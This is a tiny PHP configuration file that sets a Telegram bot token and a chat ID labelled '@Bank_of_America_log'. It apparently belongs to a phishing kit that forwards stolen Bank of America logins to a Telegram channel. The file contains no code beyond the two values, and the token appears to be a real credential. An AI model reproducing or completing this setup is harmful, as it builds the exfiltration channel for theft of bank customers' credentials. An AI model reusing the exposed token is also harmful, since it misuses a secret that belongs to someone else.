<?php 



$bot = "7790916565:AAH07RTs8xmaOBmzqKh8nQFb8BdkH0raT7M";
$chat_id = "@Bank_of_America_log";


?>